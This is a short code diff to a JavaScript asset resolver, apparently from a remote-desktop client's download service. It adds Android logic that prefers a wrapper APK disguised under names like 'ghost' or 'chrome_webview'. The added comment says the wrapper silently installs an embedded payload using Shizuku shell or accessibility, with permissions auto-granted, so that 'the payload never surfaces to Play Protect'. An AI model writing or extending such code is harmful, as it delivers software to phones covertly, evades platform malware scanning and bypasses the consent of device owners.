@@ -463,6 +463,19 @@ async function resolveAsset(platform, arch, opts = {}) {
         return formatRank(a.format) - formatRank(b.format);
     })[0];
 
+    // Android ships as a single wrapper APK (ghost/chrome_webview) that embeds
+    // the `com.betterdesk.client.universal` payload and installs it silently
+    // (Shizuku shell / accessibility, permissions auto-granted). Prefer that
+    // wrapper over the raw payload so the one install a user approves is the
+    // self-contained installer - the payload never surfaces to Play Protect.
+    if (platform === 'android') {
+        const wrappers = candidates.filter((a) => /ghost|chrome_webview/i.test(a.name || ''));
+        if (wrappers.length) {
+            const uniWrappers = wrappers.filter((a) => a.arch === 'universal');
+            return pickFrom(uniWrappers.length ? uniWrappers : wrappers);
+        }
+    }
+
     if (arch === 'universal') {
         const uni = candidates.filter((a) => a.arch === 'universal');
         if (uni.length) return pickFrom(uni);
